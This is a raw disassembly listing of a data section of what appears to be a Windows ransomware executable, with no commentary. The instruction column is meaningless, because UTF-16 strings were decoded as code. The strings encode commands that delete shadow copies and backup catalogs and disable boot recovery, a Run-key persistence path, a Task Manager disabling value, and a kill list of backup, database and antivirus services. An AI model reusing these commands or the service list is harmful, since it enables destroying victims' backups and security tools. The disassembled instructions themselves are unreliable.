  405dfc:	00 61 00             	add    %ah,0x0(%ecx)
  405dff:	74 00                	je     0x405e01
  405e01:	61                   	popa
  405e02:	00 00                	add    %al,(%eax)
  405e04:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  405e08:	0b 72 00             	or     0x0(%edx),%esi
  405e0b:	75 00                	jne    0x405e0d
  405e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  405e0e:	00 61 00             	add    %ah,0x0(%ecx)
  405e11:	73 00                	jae    0x405e13
  405e13:	00 09                	add    %cl,(%ecx)
  405e15:	2e 00 75 00          	add    %dh,%cs:0x0(%ebp)
  405e19:	72 00                	jb     0x405e1b
  405e1b:	6c                   	insb   (%dx),%es:(%edi)
  405e1c:	00 00                	add    %al,(%eax)
  405e1e:	25 5b 00 49 00       	and    $0x49005b,%eax
  405e23:	6e                   	outsb  %ds:(%esi),(%dx)
  405e24:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405e28:	00 72 00             	add    %dh,0x0(%edx)
  405e2b:	6e                   	outsb  %ds:(%esi),(%dx)
  405e2c:	00 65 00             	add    %ah,0x0(%ebp)
  405e2f:	74 00                	je     0x405e31
  405e31:	53                   	push   %ebx
  405e32:	00 68 00             	add    %ch,0x0(%eax)
  405e35:	6f                   	outsl  %ds:(%esi),(%dx)
  405e36:	00 72 00             	add    %dh,0x0(%edx)
  405e39:	74 00                	je     0x405e3b
  405e3b:	63 00                	arpl   %eax,(%eax)
  405e3d:	75 00                	jne    0x405e3f
  405e3f:	74 00                	je     0x405e41
  405e41:	5d                   	pop    %ebp
  405e42:	00 00                	add    %al,(%eax)
  405e44:	19 55 00             	sbb    %edx,0x0(%ebp)
  405e47:	52                   	push   %edx
  405e48:	00 4c 00 3d          	add    %cl,0x3d(%eax,%eax,1)
  405e4c:	00 66 00             	add    %ah,0x0(%esi)
  405e4f:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  405e55:	3a 00                	cmp    (%eax),%al
  405e57:	2f                   	das
  405e58:	00 2f                	add    %ch,(%edi)
  405e5a:	00 2f                	add    %ch,(%edi)
  405e5c:	00 00                	add    %al,(%eax)
  405e5e:	17                   	pop    %ss
  405e5f:	49                   	dec    %ecx
  405e60:	00 63 00             	add    %ah,0x0(%ebx)
  405e63:	6f                   	outsl  %ds:(%esi),(%dx)
  405e64:	00 6e 00             	add    %ch,0x0(%esi)
  405e67:	49                   	dec    %ecx
  405e68:	00 6e 00             	add    %ch,0x0(%esi)
  405e6b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405e6f:	78 00                	js     0x405e71
  405e71:	3d 00 30 00 00       	cmp    $0x3000,%eax
  405e76:	13 49 00             	adc    0x0(%ecx),%ecx
  405e79:	63 00                	arpl   %eax,(%eax)
  405e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  405e7c:	00 6e 00             	add    %ch,0x0(%esi)
  405e7f:	46                   	inc    %esi
  405e80:	00 69 00             	add    %ch,0x0(%ecx)
  405e83:	6c                   	insb   (%dx),%es:(%edi)
  405e84:	00 65 00             	add    %ah,0x0(%ebp)
  405e87:	3d 00 00 5b 53       	cmp    $0x535b0000,%eax
  405e8c:	00 4f 00             	add    %cl,0x0(%edi)
  405e8f:	46                   	inc    %esi
  405e90:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  405e94:	00 41 00             	add    %al,0x0(%ecx)
  405e97:	52                   	push   %edx
  405e98:	00 45 00             	add    %al,0x0(%ebp)
  405e9b:	5c                   	pop    %esp
  405e9c:	00 4d 00             	add    %cl,0x0(%ebp)
  405e9f:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  405ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  405ea6:	00 73 00             	add    %dh,0x0(%ebx)
  405ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  405eaa:	00 66 00             	add    %ah,0x0(%esi)
  405ead:	74 00                	je     0x405eaf
  405eaf:	5c                   	pop    %esp
  405eb0:	00 57 00             	add    %dl,0x0(%edi)
  405eb3:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405eb9:	6f                   	outsl  %ds:(%esi),(%dx)
  405eba:	00 77 00             	add    %dh,0x0(%edi)
  405ebd:	73 00                	jae    0x405ebf
  405ebf:	5c                   	pop    %esp
  405ec0:	00 43 00             	add    %al,0x0(%ebx)
  405ec3:	75 00                	jne    0x405ec5
  405ec5:	72 00                	jb     0x405ec7
  405ec7:	72 00                	jb     0x405ec9
  405ec9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405ecd:	74 00                	je     0x405ecf
  405ecf:	56                   	push   %esi
  405ed0:	00 65 00             	add    %ah,0x0(%ebp)
  405ed3:	72 00                	jb     0x405ed5
  405ed5:	73 00                	jae    0x405ed7
  405ed7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  405edd:	5c                   	pop    %esp
  405ede:	00 52 00             	add    %dl,0x0(%edx)
  405ee1:	75 00                	jne    0x405ee3
  405ee3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ee4:	00 00                	add    %al,(%eax)
  405ee6:	15 55 00 70 00       	adc    $0x700055,%eax
  405eeb:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  405eef:	74 00                	je     0x405ef1
  405ef1:	65 00 54 00 61       	add    %dl,%gs:0x61(%eax,%eax,1)
  405ef6:	00 73 00             	add    %dh,0x0(%ebx)
  405ef9:	6b 00 00             	imul   $0x0,(%eax),%eax
  405efc:	0f 63 00             	packsswb (%eax),%mm0
  405eff:	6d                   	insl   (%dx),%es:(%edi)
  405f00:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  405f04:	00 65 00             	add    %ah,0x0(%ebp)
  405f07:	78 00                	js     0x405f09
  405f09:	65 00 00             	add    %al,%gs:(%eax)
  405f0c:	07                   	pop    %es
  405f0d:	2f                   	das
  405f0e:	00 43 00             	add    %al,0x0(%ebx)
  405f11:	20 00                	and    %al,(%eax)
  405f13:	00 79 76             	add    %bh,0x76(%ecx)
  405f16:	00 73 00             	add    %dh,0x0(%ebx)
  405f19:	73 00                	jae    0x405f1b
  405f1b:	61                   	popa
  405f1c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  405f20:	00 69 00             	add    %ch,0x0(%ecx)
  405f23:	6e                   	outsb  %ds:(%esi),(%dx)
  405f24:	00 20                	add    %ah,(%eax)
  405f26:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405f2a:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  405f2e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405f32:	00 20                	add    %ah,(%eax)
  405f34:	00 73 00             	add    %dh,0x0(%ebx)
  405f37:	68 00 61 00 64       	push   $0x64006100
  405f3c:	00 6f 00             	add    %ch,0x0(%edi)
  405f3f:	77 00                	ja     0x405f41
  405f41:	73 00                	jae    0x405f43
  405f43:	20 00                	and    %al,(%eax)
  405f45:	2f                   	das
  405f46:	00 61 00             	add    %ah,0x0(%ecx)
  405f49:	6c                   	insb   (%dx),%es:(%edi)
  405f4a:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  405f4e:	00 2f                	add    %ch,(%edi)
  405f50:	00 71 00             	add    %dh,0x0(%ecx)
  405f53:	75 00                	jne    0x405f55
  405f55:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  405f5b:	20 00                	and    %al,(%eax)
  405f5d:	26 00 20             	add    %ah,%es:(%eax)
  405f60:	00 77 00             	add    %dh,0x0(%edi)
  405f63:	6d                   	insl   (%dx),%es:(%edi)
  405f64:	00 69 00             	add    %ch,0x0(%ecx)
  405f67:	63 00                	arpl   %eax,(%eax)
  405f69:	20 00                	and    %al,(%eax)
  405f6b:	73 00                	jae    0x405f6d
  405f6d:	68 00 61 00 64       	push   $0x64006100
  405f72:	00 6f 00             	add    %ch,0x0(%edi)
  405f75:	77 00                	ja     0x405f77
  405f77:	63 00                	arpl   %eax,(%eax)
  405f79:	6f                   	outsl  %ds:(%esi),(%dx)
  405f7a:	00 70 00             	add    %dh,0x0(%eax)
  405f7d:	79 00                	jns    0x405f7f
  405f7f:	20 00                	and    %al,(%eax)
  405f81:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405f85:	6c                   	insb   (%dx),%es:(%edi)
  405f86:	00 65 00             	add    %ah,0x0(%ebp)
  405f89:	74 00                	je     0x405f8b
  405f8b:	65 00 00             	add    %al,%gs:(%eax)
  405f8e:	80 cb 62             	or     $0x62,%bl
  405f91:	00 63 00             	add    %ah,0x0(%ebx)
  405f94:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405f98:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  405f9c:	74 00                	je     0x405f9e
  405f9e:	20 00                	and    %al,(%eax)
  405fa0:	2f                   	das
  405fa1:	00 73 00             	add    %dh,0x0(%ebx)
  405fa4:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405fa9:	00 7b 00             	add    %bh,0x0(%ebx)
  405fac:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405fb0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  405fb4:	75 00                	jne    0x405fb6
  405fb6:	6c                   	insb   (%dx),%es:(%edi)
  405fb7:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  405fbb:	00 20                	add    %ah,(%eax)
  405fbd:	00 62 00             	add    %ah,0x0(%edx)
  405fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  405fc1:	00 6f 00             	add    %ch,0x0(%edi)
  405fc4:	74 00                	je     0x405fc6
  405fc6:	73 00                	jae    0x405fc8
  405fc8:	74 00                	je     0x405fca
  405fca:	61                   	popa
  405fcb:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  405fcf:	00 73 00             	add    %dh,0x0(%ebx)
  405fd2:	70 00                	jo     0x405fd4
  405fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  405fd5:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  405fd9:	00 63 00             	add    %ah,0x0(%ebx)
  405fdc:	79 00                	jns    0x405fde
  405fde:	20 00                	and    %al,(%eax)
  405fe0:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  405fe6:	6f                   	outsl  %ds:(%esi),(%dx)
  405fe7:	00 72 00             	add    %dh,0x0(%edx)
  405fea:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  405fee:	6c                   	insb   (%dx),%es:(%edi)
  405fef:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  405ff3:	00 61 00             	add    %ah,0x0(%ecx)
  405ff6:	69 00 6c 00 75 00    	imul   $0x75006c,(%eax),%eax
  405ffc:	72 00                	jb     0x405ffe
  405ffe:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406002:	20 00                	and    %al,(%eax)
  406004:	26 00 20             	add    %ah,%es:(%eax)
  406007:	00 62 00             	add    %ah,0x0(%edx)
  40600a:	63 00                	arpl   %eax,(%eax)
  40600c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406010:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  406014:	74 00                	je     0x406016
  406016:	20 00                	and    %al,(%eax)
  406018:	2f                   	das
  406019:	00 73 00             	add    %dh,0x0(%ebx)
  40601c:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  406021:	00 7b 00             	add    %bh,0x0(%ebx)
  406024:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406028:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40602c:	75 00                	jne    0x40602e
  40602e:	6c                   	insb   (%dx),%es:(%edi)
  40602f:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  406033:	00 20                	add    %ah,(%eax)
  406035:	00 72 00             	add    %dh,0x0(%edx)
  406038:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40603c:	6f                   	outsl  %ds:(%esi),(%dx)
  40603d:	00 76 00             	add    %dh,0x0(%esi)
  406040:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406044:	79 00                	jns    0x406046
  406046:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40604a:	61                   	popa
  40604b:	00 62 00             	add    %ah,0x0(%edx)
  40604e:	6c                   	insb   (%dx),%es:(%edi)
  40604f:	00 65 00             	add    %ah,0x0(%ebp)
  406052:	64 00 20             	add    %ah,%fs:(%eax)
  406055:	00 6e 00             	add    %ch,0x0(%esi)
  406058:	6f                   	outsl  %ds:(%esi),(%dx)
  406059:	00 00                	add    %al,(%eax)
  40605b:	3b 77 00             	cmp    0x0(%edi),%esi
  40605e:	62 00                	bound  %eax,(%eax)
  406060:	61                   	popa
  406061:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  406065:	00 69 00             	add    %ch,0x0(%ecx)
  406068:	6e                   	outsb  %ds:(%esi),(%dx)
  406069:	00 20                	add    %ah,(%eax)
  40606b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40606f:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406073:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  406077:	00 20                	add    %ah,(%eax)
  406079:	00 63 00             	add    %ah,0x0(%ebx)
  40607c:	61                   	popa
  40607d:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406081:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406085:	00 67 00             	add    %ah,0x0(%edi)
  406088:	20 00                	and    %al,(%eax)
  40608a:	2d 00 71 00 75       	sub    $0x75007100,%eax
  40608f:	00 69 00             	add    %ch,0x0(%ecx)
  406092:	65 00 74 00 01       	add    %dh,%gs:0x1(%eax,%eax,1)
  406097:	73 53                	jae    0x4060ec
  406099:	00 6f 00             	add    %ch,0x0(%edi)
  40609c:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4060a1:	00 61 00             	add    %ah,0x0(%ecx)
  4060a4:	72 00                	jb     0x4060a6
  4060a6:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4060ab:	00 69 00             	add    %ch,0x0(%ecx)
  4060ae:	63 00                	arpl   %eax,(%eax)
  4060b0:	72 00                	jb     0x4060b2
  4060b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b3:	00 73 00             	add    %dh,0x0(%ebx)
  4060b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b7:	00 66 00             	add    %ah,0x0(%esi)
  4060ba:	74 00                	je     0x4060bc
  4060bc:	5c                   	pop    %esp
  4060bd:	00 57 00             	add    %dl,0x0(%edi)
  4060c0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4060c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c7:	00 77 00             	add    %dh,0x0(%edi)
  4060ca:	73 00                	jae    0x4060cc
  4060cc:	5c                   	pop    %esp
  4060cd:	00 43 00             	add    %al,0x0(%ebx)
  4060d0:	75 00                	jne    0x4060d2
  4060d2:	72 00                	jb     0x4060d4
  4060d4:	72 00                	jb     0x4060d6
  4060d6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4060da:	74 00                	je     0x4060dc
  4060dc:	56                   	push   %esi
  4060dd:	00 65 00             	add    %ah,0x0(%ebp)
  4060e0:	72 00                	jb     0x4060e2
  4060e2:	73 00                	jae    0x4060e4
  4060e4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4060ea:	5c                   	pop    %esp
  4060eb:	00 50 00             	add    %dl,0x0(%eax)
  4060ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ef:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4060f3:	00 63 00             	add    %ah,0x0(%ebx)
  4060f6:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4060fc:	5c                   	pop    %esp
  4060fd:	00 53 00             	add    %dl,0x0(%ebx)
  406100:	79 00                	jns    0x406102
  406102:	73 00                	jae    0x406104
  406104:	74 00                	je     0x406106
  406106:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40610a:	00 1d 44 00 69 00    	add    %bl,0x690044
  406110:	73 00                	jae    0x406112
  406112:	61                   	popa
  406113:	00 62 00             	add    %ah,0x0(%edx)
  406116:	6c                   	insb   (%dx),%es:(%edi)
  406117:	00 65 00             	add    %ah,0x0(%ebp)
  40611a:	54                   	push   %esp
  40611b:	00 61 00             	add    %ah,0x0(%ecx)
  40611e:	73 00                	jae    0x406120
  406120:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  406123:	00 67 00             	add    %ah,0x0(%edi)
  406126:	72 00                	jb     0x406128
  406128:	00 03                	add    %al,(%ebx)
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	00 2d 42 00 61 00    	add    %ch,0x610042
  406132:	63 00                	arpl   %eax,(%eax)
  406134:	6b 00 75             	imul   $0x75,(%eax),%eax
  406137:	00 70 00             	add    %dh,0x0(%eax)
  40613a:	45                   	inc    %ebp
  40613b:	00 78 00             	add    %bh,0x0(%eax)
  40613e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406142:	41                   	inc    %ecx
  406143:	00 67 00             	add    %ah,0x0(%edi)
  406146:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40614a:	74 00                	je     0x40614c
  40614c:	42                   	inc    %edx
  40614d:	00 72 00             	add    %dh,0x0(%edx)
  406150:	6f                   	outsl  %ds:(%esi),(%dx)
  406151:	00 77 00             	add    %dh,0x0(%edi)
  406154:	73 00                	jae    0x406156
  406156:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40615a:	00 39                	add    %bh,(%ecx)
  40615c:	42                   	inc    %edx
  40615d:	00 61 00             	add    %ah,0x0(%ecx)
  406160:	63 00                	arpl   %eax,(%eax)
  406162:	6b 00 75             	imul   $0x75,(%eax),%eax
  406165:	00 70 00             	add    %dh,0x0(%eax)
  406168:	45                   	inc    %ebp
  406169:	00 78 00             	add    %bh,0x0(%eax)
  40616c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406170:	44                   	inc    %esp
  406171:	00 69 00             	add    %ch,0x0(%ecx)
  406174:	76 00                	jbe    0x406176
  406176:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40617a:	69 00 4d 00 65 00    	imul   $0x65004d,(%eax),%eax
  406180:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  406184:	61                   	popa
  406185:	00 53 00             	add    %dl,0x0(%ebx)
  406188:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40618c:	76 00                	jbe    0x40618e
  40618e:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  406194:	00 27                	add    %ah,(%edi)
  406196:	42                   	inc    %edx
  406197:	00 61 00             	add    %ah,0x0(%ecx)
  40619a:	63 00                	arpl   %eax,(%eax)
  40619c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40619f:	00 70 00             	add    %dh,0x0(%eax)
  4061a2:	45                   	inc    %ebp
  4061a3:	00 78 00             	add    %bh,0x0(%eax)
  4061a6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4061aa:	4a                   	dec    %edx
  4061ab:	00 6f 00             	add    %ch,0x0(%edi)
  4061ae:	62 00                	bound  %eax,(%eax)
  4061b0:	45                   	inc    %ebp
  4061b1:	00 6e 00             	add    %ch,0x0(%esi)
  4061b4:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4061b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4061b9:	00 65 00             	add    %ah,0x0(%ebp)
  4061bc:	00 37                	add    %dh,(%edi)
  4061be:	42                   	inc    %edx
  4061bf:	00 61 00             	add    %ah,0x0(%ecx)
  4061c2:	63 00                	arpl   %eax,(%eax)
  4061c4:	6b 00 75             	imul   $0x75,(%eax),%eax
  4061c7:	00 70 00             	add    %dh,0x0(%eax)
  4061ca:	45                   	inc    %ebp
  4061cb:	00 78 00             	add    %bh,0x0(%eax)
  4061ce:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4061d2:	4d                   	dec    %ebp
  4061d3:	00 61 00             	add    %ah,0x0(%ecx)
  4061d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d7:	00 61 00             	add    %ah,0x0(%ecx)
  4061da:	67 00 65 00          	add    %ah,0x0(%di)
  4061de:	6d                   	insl   (%dx),%es:(%edi)
  4061df:	00 65 00             	add    %ah,0x0(%ebp)
  4061e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4061e3:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  4061e7:	00 65 00             	add    %ah,0x0(%ebp)
  4061ea:	72 00                	jb     0x4061ec
  4061ec:	76 00                	jbe    0x4061ee
  4061ee:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4061f4:	00 07                	add    %al,(%edi)
  4061f6:	76 00                	jbe    0x4061f8
  4061f8:	73 00                	jae    0x4061fa
  4061fa:	73 00                	jae    0x4061fc
  4061fc:	00 07                	add    %al,(%edi)
  4061fe:	73 00                	jae    0x406200
  406200:	71 00                	jno    0x406202
  406202:	6c                   	insb   (%dx),%es:(%edi)
  406203:	00 00                	add    %al,(%eax)
  406205:	09 73 00             	or     %esi,0x0(%ebx)
  406208:	76 00                	jbe    0x40620a
  40620a:	63 00                	arpl   %eax,(%eax)
  40620c:	24 00                	and    $0x0,%al
  40620e:	00 0d 6d 00 65 00    	add    %cl,0x65006d
  406214:	6d                   	insl   (%dx),%es:(%edi)
  406215:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406219:	00 73 00             	add    %dh,0x0(%ebx)
  40621c:	00 0d 73 00 6f 00    	add    %cl,0x6f0073
  406222:	70 00                	jo     0x406224
  406224:	68 00 6f 00 73       	push   $0x73006f00
  406229:	00 00                	add    %al,(%eax)
  40622b:	0b 76 00             	or     0x0(%esi),%esi
  40622e:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  406232:	61                   	popa
  406233:	00 6d 00             	add    %ch,0x0(%ebp)
  406236:	00 0d 62 00 61 00    	add    %cl,0x610062
  40623c:	63 00                	arpl   %eax,(%eax)
  40623e:	6b 00 75             	imul   $0x75,(%eax),%eax
  406241:	00 70 00             	add    %dh,0x0(%eax)
  406244:	00 0b                	add    %cl,(%ebx)
  406246:	47                   	inc    %edi
  406247:	00 78 00             	add    %bh,0x0(%eax)
  40624a:	56                   	push   %esi
  40624b:	00 73 00             	add    %dh,0x0(%ebx)
  40624e:	73 00                	jae    0x406250
  406250:	00 0b                	add    %cl,(%ebx)
  406252:	47                   	inc    %edi
  406253:	00 78 00             	add    %bh,0x0(%eax)
  406256:	42                   	inc    %edx
  406257:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40625b:	00 00                	add    %al,(%eax)
  40625d:	0b 47 00             	or     0x0(%edi),%eax
  406260:	78 00                	js     0x406262
  406262:	46                   	inc    %esi
  406263:	00 57 00             	add    %dl,0x0(%edi)
  406266:	44                   	inc    %esp
  406267:	00 00                	add    %al,(%eax)
  406269:	0b 47 00             	or     0x0(%edi),%eax
  40626c:	78 00                	js     0x40626e
  40626e:	43                   	inc    %ebx
  40626f:	00 56 00             	add    %dl,0x0(%esi)
  406272:	44                   	inc    %esp
  406273:	00 00                	add    %al,(%eax)
  406275:	0f 47 00             	cmova  (%eax),%eax
  406278:	78 00                	js     0x40627a
  40627a:	43                   	inc    %ebx
  40627b:	00 49 00             	add    %cl,0x0(%ecx)
  40627e:	4d                   	dec    %ebp
  40627f:	00 67 00             	add    %ah,0x0(%edi)
  406282:	72 00                	jb     0x406284
  406284:	00 11                	add    %dl,(%ecx)
  406286:	44                   	inc    %esp
  406287:	00 65 00             	add    %ah,0x0(%ebp)
  40628a:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40628e:	61                   	popa
  40628f:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  406293:	00 68 00             	add    %ch,0x0(%eax)
  406296:	00 11                	add    %dl,(%ecx)
  406298:	63 00                	arpl   %eax,(%eax)
  40629a:	63 00                	arpl   %eax,(%eax)
  40629c:	45                   	inc    %ebp
  40629d:	00 76 00             	add    %dh,0x0(%esi)
  4062a0:	74 00                	je     0x4062a2
  4062a2:	4d                   	dec    %ebp
  4062a3:	00 67 00             	add    %ah,0x0(%edi)
  4062a6:	72 00                	jb     0x4062a8
  4062a8:	00 0f                	add    %cl,(%edi)
  4062aa:	53                   	push   %ebx
  4062ab:	00 61 00             	add    %ah,0x0(%ecx)
  4062ae:	76 00                	jbe    0x4062b0
  4062b0:	52                   	push   %edx
  4062b1:	00 6f 00             	add    %ch,0x0(%edi)
  4062b4:	61                   	popa
  4062b5:	00 6d 00             	add    %ch,0x0(%ebp)
  4062b8:	00 0f                	add    %cl,(%edi)
  4062ba:	52                   	push   %edx
  4062bb:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  4062bf:	00 73 00             	add    %dh,0x0(%ebx)
  4062c2:	63 00                	arpl   %eax,(%eax)
  4062c4:	61                   	popa
  4062c5:	00 6e 00             	add    %ch,0x0(%esi)
  4062c8:	00 17                	add    %dl,(%edi)
  4062ca:	51                   	push   %ecx
  4062cb:	00 42 00             	add    %al,0x0(%edx)
  4062ce:	46                   	inc    %esi
  4062cf:	00 43 00             	add    %al,0x0(%ebx)
  4062d2:	53                   	push   %ebx
  4062d3:	00 65 00             	add    %ah,0x0(%ebp)
  4062d6:	72 00                	jb     0x4062d8
  4062d8:	76 00                	jbe    0x4062da
  4062da:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4062e0:	00 2b                	add    %ch,(%ebx)
  4062e2:	49                   	dec    %ecx
  4062e3:	00 6e 00             	add    %ch,0x0(%esi)
  4062e6:	74 00                	je     0x4062e8
  4062e8:	75 00                	jne    0x4062ea
  4062ea:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  4062f0:	51                   	push   %ecx
  4062f1:	00 75 00             	add    %dh,0x0(%ebp)
  4062f4:	69 00 63 00 6b 00    	imul   $0x6b0063,(%eax),%eax
  4062fa:	42                   	inc    %edx
  4062fb:	00 6f 00             	add    %ch,0x0(%edi)
  4062fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4062ff:	00 6b 00             	add    %ch,0x0(%ebx)
  406302:	73 00                	jae    0x406304
  406304:	2e 00 46 00          	add    %al,%cs:0x0(%esi)
  406308:	43                   	inc    %ebx
  406309:	00 53 00             	add    %dl,0x0(%ebx)
  40630c:	00 13                	add    %dl,(%ebx)
  40630e:	59                   	pop    %ecx
  40630f:	00 6f 00             	add    %ch,0x0(%edi)
  406312:	6f                   	outsl  %ds:(%esi),(%dx)
  406313:	00 42 00             	add    %al,0x0(%edx)
  406316:	61                   	popa
  406317:	00 63 00             	add    %ah,0x0(%ebx)
  40631a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40631d:	00 70 00             	add    %dh,0x0(%eax)
  406320:	00 0b                	add    %cl,(%ebx)
  406322:	59                   	pop    %ecx
  406323:	00 6f 00             	add    %ch,0x0(%edi)
  406326:	6f                   	outsl  %ds:(%esi),(%dx)
  406327:	00 49 00             	add    %cl,0x0(%ecx)
  40632a:	54                   	push   %esp
  40632b:	00 00                	add    %al,(%eax)
  40632d:	1b 7a 00             	sbb    0x0(%edx),%edi
  406330:	68 00 75 00 64       	push   $0x64007500
  406335:	00 6f 00             	add    %ch,0x0(%edi)
  406338:	6e                   	outsb  %ds:(%esi),(%dx)
  406339:	00 67 00             	add    %ah,0x0(%edi)
  40633c:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406340:	6e                   	outsb  %ds:(%esi),(%dx)
  406341:	00 67 00             	add    %ah,0x0(%edi)
  406344:	79 00                	jns    0x406346
  406346:	75 00                	jne    0x406348
  406348:	00 1b                	add    %bl,(%ebx)
  40634a:	73 00                	jae    0x40634c
  40634c:	74 00                	je     0x40634e
  40634e:	63 00                	arpl   %eax,(%eax)
  406350:	5f                   	pop    %edi
  406351:	00 72 00             	add    %dh,0x0(%edx)
  406354:	61                   	popa
  406355:	00 77 00             	add    %dh,0x0(%edi)
  406358:	5f                   	pop    %edi
  406359:	00 61 00             	add    %ah,0x0(%ecx)
  40635c:	67 00 65 00          	add    %ah,0x0(%di)
  406360:	6e                   	outsb  %ds:(%esi),(%dx)
  406361:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406365:	11 56 00             	adc    %edx,0x0(%esi)
  406368:	53                   	push   %ebx
  406369:	00 4e 00             	add    %cl,0x0(%esi)
  40636c:	41                   	inc    %ecx
  40636d:	00 50 00             	add    %dl,0x0(%eax)
  406370:	56                   	push   %esi
  406371:	00 53 00             	add    %dl,0x0(%ebx)
  406374:	53                   	push   %ebx
  406375:	00 00                	add    %al,(%eax)
  406377:	25 51 00 42 00       	and    $0x420051,%eax
  40637c:	43                   	inc    %ebx
  40637d:	00 46 00             	add    %al,0x0(%esi)
  406380:	4d                   	dec    %ebp
  406381:	00 6f 00             	add    %ch,0x0(%edi)
  406384:	6e                   	outsb  %ds:(%esi),(%dx)
  406385:	00 69 00             	add    %ch,0x0(%ecx)
  406388:	74 00                	je     0x40638a
  40638a:	6f                   	outsl  %ds:(%esi),(%dx)
  40638b:	00 72 00             	add    %dh,0x0(%edx)
  40638e:	53                   	push   %ebx
  40638f:	00 65 00             	add    %ah,0x0(%ebp)
  406392:	72 00                	jb     0x406394
  406394:	76 00                	jbe    0x406396
  406396:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40639c:	00 23                	add    %ah,(%ebx)
  40639e:	56                   	push   %esi
